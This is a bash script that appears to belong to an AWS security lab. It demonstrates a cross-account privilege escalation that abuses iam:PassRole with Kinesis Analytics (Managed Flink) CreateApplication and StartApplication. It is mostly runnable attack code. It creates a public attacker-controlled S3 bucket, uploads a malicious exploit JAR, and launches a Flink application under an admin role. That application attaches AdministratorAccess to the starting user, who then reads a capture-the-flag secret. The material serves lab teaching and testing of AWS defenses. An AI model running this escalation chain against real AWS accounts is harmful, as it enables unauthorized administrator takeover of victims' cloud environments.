#!/bin/bash
set -e

# Cross-account demo script for iam:PassRole + kinesisanalytics:CreateApplication + kinesisanalytics:StartApplication
# This variant hosts the malicious JAR in an attacker-controlled S3 bucket (separate AWS account)
# with a public-read bucket policy, proving the exploit works with externally-hosted artifacts.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-kinesisanalytics-001-to-admin-starting-user"
ADMIN_ROLE_NAME="pl-prod-kinesisanalytics-001-to-admin-admin-role"
APP_NAME="pl-prod-kinesisanalytics-001-to-admin-app"
ATTACKER_PROFILE="demo-attacker.AWSAdministratorAccess"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Attacker bucket state (used by cleanup trap)
ATTACKER_BUCKET_NAME=""
ATTACKER_BUCKET_CREATED=false

# Cleanup the attacker bucket on exit (success or failure)
cleanup_attacker_bucket() {
    if [ "$ATTACKER_BUCKET_CREATED" = true ] && [ -n "$ATTACKER_BUCKET_NAME" ]; then
        echo -e "\n${YELLOW}Cleaning up attacker bucket: $ATTACKER_BUCKET_NAME${NC}"
        aws s3 rm "s3://$ATTACKER_BUCKET_NAME" --recursive --profile "$ATTACKER_PROFILE" 2>/dev/null
        aws s3api delete-bucket --bucket "$ATTACKER_BUCKET_NAME" --profile "$ATTACKER_PROFILE" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}Attacker bucket deleted${NC}"
        else
            echo -e "${YELLOW}Warning: Could not delete attacker bucket $ATTACKER_BUCKET_NAME${NC}"
            echo "  Manual cleanup: aws s3 rb s3://$ATTACKER_BUCKET_NAME --force --profile $ATTACKER_PROFILE"
        fi
    fi
}
trap cleanup_attacker_bucket EXIT

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Kinesis Analytics CreateApplication + StartApplication${NC}"
echo -e "${GREEN}Privilege Escalation Demo (Cross-Account Attacker Bucket)${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_kinesisanalytics_001_iam_passrole_kinesisanalytics_createapplication_kinesisanalytics_startapplication.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output (no S3 info needed -- we use the attacker bucket)
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Retrieve readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account IDs (victim + attacker)
echo -e "${YELLOW}Step 3: Getting account IDs${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
VICTIM_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Victim Account ID: $VICTIM_ACCOUNT_ID"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text --profile $ATTACKER_PROFILE"
ATTACKER_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text --profile "$ATTACKER_PROFILE" 2>&1)
if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Could not get attacker account identity using profile '$ATTACKER_PROFILE'${NC}"
    echo "Make sure the AWS profile '$ATTACKER_PROFILE' is configured"
    echo "$ATTACKER_ACCOUNT_ID"
    exit 1
fi
echo "Attacker Account ID: $ATTACKER_ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account IDs${NC}\n"

# [EXPLOIT]
# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying starting user doesn't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT]
# Step 5: Create attacker-controlled S3 bucket with public-read policy
echo -e "${YELLOW}Step 5: Creating attacker-controlled S3 bucket with malicious JAR${NC}"
ATTACKER_BUCKET_NAME="pl-attacker-kinesisanalytics-001-exploit-${ATTACKER_ACCOUNT_ID}"

echo "Attacker bucket: $ATTACKER_BUCKET_NAME"
echo "Using attacker profile: $ATTACKER_PROFILE"

# Create the bucket in the attacker account
show_cmd "Attacker" "aws s3api create-bucket --bucket $ATTACKER_BUCKET_NAME --region $AWS_REGION --profile $ATTACKER_PROFILE"
if [ "$AWS_REGION" = "us-east-1" ]; then
    aws s3api create-bucket \
        --bucket "$ATTACKER_BUCKET_NAME" \
        --region "$AWS_REGION" \
        --profile "$ATTACKER_PROFILE" 2>&1
else
    aws s3api create-bucket \
        --bucket "$ATTACKER_BUCKET_NAME" \
        --region "$AWS_REGION" \
        --create-bucket-configuration "LocationConstraint=$AWS_REGION" \
        --profile "$ATTACKER_PROFILE" 2>&1
fi

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create attacker bucket${NC}"
    exit 1
fi
ATTACKER_BUCKET_CREATED=true
echo -e "${GREEN}✓ Attacker bucket created${NC}"

# Upload the exploit JAR
echo "Uploading exploit JAR to attacker bucket..."
EXPLOIT_JAR_PATH="$SCRIPT_DIR/exploit-jar/exploit.jar"
if [ ! -f "$EXPLOIT_JAR_PATH" ]; then
    echo -e "${RED}Error: exploit.jar not found at $EXPLOIT_JAR_PATH${NC}"
    echo "Build it with: cd exploit-jar && ./build.sh (requires Docker)"
    exit 1
fi

show_cmd "Attacker" "aws s3 cp exploit-jar/exploit.jar s3://$ATTACKER_BUCKET_NAME/exploit.jar --profile $ATTACKER_PROFILE"
aws s3 cp "$EXPLOIT_JAR_PATH" "s3://$ATTACKER_BUCKET_NAME/exploit.jar" --profile "$ATTACKER_PROFILE" 2>&1

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to upload exploit JAR to attacker bucket${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Exploit JAR uploaded${NC}"

# Disable S3 Block Public Access on the bucket (enabled by default since April 2023)
echo "Disabling S3 Block Public Access on attacker bucket..."
show_cmd "Attacker" "aws s3api put-public-access-block --bucket $ATTACKER_BUCKET_NAME --public-access-block-configuration BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false --profile $ATTACKER_PROFILE"
aws s3api put-public-access-block \
    --bucket "$ATTACKER_BUCKET_NAME" \
    --public-access-block-configuration "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false" \
    --profile "$ATTACKER_PROFILE" 2>&1

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to disable S3 Block Public Access on attacker bucket${NC}"
    exit 1
fi
echo -e "${GREEN}✓ S3 Block Public Access disabled on bucket${NC}"

# Apply public-read bucket policy so the Flink service can read the JAR
echo "Applying public-read bucket policy..."
BUCKET_POLICY=$(cat <<POLICYEOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "PublicReadGetObject",
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::$ATTACKER_BUCKET_NAME/*"
        }
    ]
}
POLICYEOF
)

show_cmd "Attacker" "aws s3api put-bucket-policy --bucket $ATTACKER_BUCKET_NAME --policy '...' --profile $ATTACKER_PROFILE"
echo "$BUCKET_POLICY" | aws s3api put-bucket-policy \
    --bucket "$ATTACKER_BUCKET_NAME" \
    --policy file:///dev/stdin \
    --profile "$ATTACKER_PROFILE" 2>&1

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to apply bucket policy${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Public-read bucket policy applied${NC}"

echo ""
echo "Attacker S3 location: s3://$ATTACKER_BUCKET_NAME/exploit.jar"
echo "Source code: exploit-jar/src/main/java/com/exploit/EscalationJob.java"
echo "To rebuild: cd exploit-jar && ./build.sh (requires Docker)"
echo -e "${GREEN}✓ Attacker bucket ready with exploit JAR${NC}\n"

# [EXPLOIT]
# Step 6: Create the Managed Apache Flink application referencing attacker bucket
use_starting_creds
echo -e "${YELLOW}Step 6: Creating Managed Apache Flink application with attacker-hosted malicious code${NC}"
echo "Application name: $APP_NAME"
echo "Runtime: FLINK-1_19"
echo "Code location: s3://$ATTACKER_BUCKET_NAME/exploit.jar (ATTACKER BUCKET)"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"

# Build the application configuration JSON using S3ContentLocation pointing at attacker bucket
cat > /tmp/kinesisanalytics-001-app-config.json << CONFIGEOF
{
    "ApplicationName": "$APP_NAME",
    "RuntimeEnvironment": "FLINK-1_19",
    "ServiceExecutionRole": "$ADMIN_ROLE_ARN",
    "ApplicationConfiguration": {
        "ApplicationCodeConfiguration": {
            "CodeContent": {
                "S3ContentLocation": {
                    "BucketARN": "arn:aws:s3:::$ATTACKER_BUCKET_NAME",
                    "FileKey": "exploit.jar"
                }
            },
            "CodeContentType": "ZIPFILE"
        },
        "FlinkApplicationConfiguration": {
            "ParallelismConfiguration": {
                "ConfigurationType": "CUSTOM",
                "Parallelism": 1,
                "ParallelismPerKPU": 1
            }
        }
    }
}
CONFIGEOF

show_attack_cmd "Attacker" "aws kinesisanalyticsv2 create-application --region $AWS_REGION --cli-input-json file:///tmp/kinesisanalytics-001-app-config.json"
APP_RESULT=$(aws kinesisanalyticsv2 create-application \
    --region $AWS_REGION \
    --cli-input-json file:///tmp/kinesisanalytics-001-app-config.json \
    --output json 2>&1)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create Flink application${NC}"
    echo "$APP_RESULT"
    rm -f /tmp/kinesisanalytics-001-app-config.json
    exit 1
fi

APP_ARN=$(echo "$APP_RESULT" | jq -r '.ApplicationDetail.ApplicationARN')
APP_VERSION=$(echo "$APP_RESULT" | jq -r '.ApplicationDetail.ApplicationVersionId')
echo "Application ARN: $APP_ARN"
echo "Application Version: $APP_VERSION"
echo -e "${GREEN}✓ Flink application created (referencing attacker bucket)${NC}\n"

# [EXPLOIT]
# Step 7: Start the Flink application
use_starting_creds
echo -e "${YELLOW}Step 7: Starting the Flink application (privilege escalation trigger)${NC}"
echo "This is the privilege escalation vector - the application starts with the admin"
echo "service execution role and runs our malicious code which calls iam:AttachUserPolicy."
echo "The JAR is fetched from the attacker-controlled bucket via the public bucket policy."

show_attack_cmd "Attacker" "aws kinesisanalyticsv2 start-application --region $AWS_REGION --application-name $APP_NAME"
START_RESULT=$(aws kinesisanalyticsv2 start-application \
    --region $AWS_REGION \
    --application-name "$APP_NAME" 2>&1)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to start Flink application${NC}"
    echo "$START_RESULT"
    rm -f /tmp/kinesisanalytics-001-app-config.json
    exit 1
fi

echo -e "${GREEN}✓ Flink application start initiated${NC}\n"

# [OBSERVATION]
# Step 8: Wait for application to reach RUNNING state and for privilege escalation
use_readonly_creds
echo -e "${YELLOW}Step 8: Waiting for Flink application to run and escalate privileges${NC}"
echo "The application needs 2-5 minutes to start up. Once running, the malicious code"
echo "executes immediately to attach AdministratorAccess to the starting user."
echo "Polling application status and checking for escalation..."
echo ""

MAX_WAIT=600  # 10 minutes
ELAPSED=0
ESCALATION_SUCCEEDED=false

while [ $ELAPSED -lt $MAX_WAIT ]; do
    MINUTES_ELAPSED=$((ELAPSED / 60))
    SECONDS_REMAINING=$((ELAPSED % 60))

    # Check application status
    show_cmd "ReadOnly" "aws kinesisanalyticsv2 describe-application --region $AWS_REGION --application-name $APP_NAME --query 'ApplicationDetail.ApplicationStatus' --output text"
    APP_STATUS=$(aws kinesisanalyticsv2 describe-application \
        --region $AWS_REGION \
        --application-name "$APP_NAME" \
        --query 'ApplicationDetail.ApplicationStatus' \
        --output text 2>/dev/null)

    echo "[${MINUTES_ELAPSED}m ${SECONDS_REMAINING}s] Application status: $APP_STATUS"

    # Check if AdministratorAccess has been attached to starting user
    ADMIN_ATTACHED=$(aws iam list-attached-user-policies \
        --user-name "$STARTING_USER" \
        --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
        --output text 2>/dev/null)

    if [ -n "$ADMIN_ATTACHED" ] && [ "$ADMIN_ATTACHED" != "None" ]; then
        echo -e "${GREEN}AdministratorAccess detected on $STARTING_USER!${NC}"
        ESCALATION_SUCCEEDED=true
        break
    fi

    # If application failed, the exploit failed
    if [ "$APP_STATUS" == "READY" ] && [ $ELAPSED -gt 60 ]; then
        # Application reverted to READY - means it failed to start properly
        echo -e "${RED}Application reverted to READY state - the job may have failed${NC}"
    fi

    sleep 30
    ELAPSED=$((ELAPSED + 30))
done

if [ "$ESCALATION_SUCCEEDED" != "true" ]; then
    echo -e "${RED}Error: Privilege escalation did not succeed within 10 minutes${NC}"
    echo "Application status: $APP_STATUS"
    echo "The Flink application may have failed to execute the exploit."
    echo "Check CloudWatch Logs for application output."
    rm -f /tmp/kinesisanalytics-001-app-config.json
    exit 1
fi
echo ""

# [OBSERVATION]
# Step 9: Verify privilege escalation success
echo -e "${YELLOW}Step 9: Verifying privilege escalation success${NC}"

# Wait for IAM propagation
echo "Waiting 15 seconds for IAM policy propagation..."
sleep 15

use_readonly_creds
echo "Checking attached policies on starting user..."
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --output table 2>&1)
echo "$ATTACHED_POLICIES"
echo -e "${GREEN}✓ AdministratorAccess policy confirmed on $STARTING_USER${NC}"
echo ""

# [EXPLOIT]
# Step 10: Capture the CTF flag
# The starting user now has AdministratorAccess attached. Use those credentials to read the flag.
use_starting_creds
echo -e "${YELLOW}Step 10: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/kinesisanalytics-001-to-admin"
show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Clean up temporary files
rm -f /tmp/kinesisanalytics-001-app-config.json

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED! (Cross-Account Variant)${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, kinesisanalytics:CreateApplication, kinesisanalytics:StartApplication)"
echo "2. Created attacker-controlled S3 bucket ($ATTACKER_BUCKET_NAME) with public-read policy"
echo "3. Uploaded malicious Apache Flink JAR to attacker bucket"
echo "4. Created Managed Apache Flink application referencing JAR in attacker bucket"
echo "5. Started the application, passing $ADMIN_ROLE_NAME as the service execution role"
echo "6. Flink app fetched JAR from attacker bucket and used admin role to attach AdministratorAccess"
echo "7. Achieved: Administrator Access"
echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER"
echo "  -> (kinesisanalytics:CreateApplication with S3 code from ATTACKER bucket)"
echo "  -> Flink app fetches malicious JAR from s3://$ATTACKER_BUCKET_NAME/exploit.jar"
echo "  -> (iam:PassRole + kinesisanalytics:StartApplication with $ADMIN_ROLE_NAME)"
echo "  -> Flink job calls iam:AttachUserPolicy -> Admin"
echo "  -> (ssm:GetParameter) -> CTF Flag"

echo -e "\n${YELLOW}Cross-Account Detail:${NC}"
echo "  Victim Account:   $VICTIM_ACCOUNT_ID"
echo "  Attacker Account:  $ATTACKER_ACCOUNT_ID"
echo "  Attacker Bucket:   $ATTACKER_BUCKET_NAME (public-read policy)"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Managed Apache Flink Application: $APP_NAME"
echo "- Application ARN: $APP_ARN"
echo "- AdministratorAccess policy attached to $STARTING_USER"
echo "- Attacker bucket: $ATTACKER_BUCKET_NAME (will be deleted on exit)"

echo -e "\n${RED}Warning: The Flink application is still running and may incur charges${NC}"
echo -e "${RED}Warning: AdministratorAccess is still attached to $STARTING_USER${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack_cross_account.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
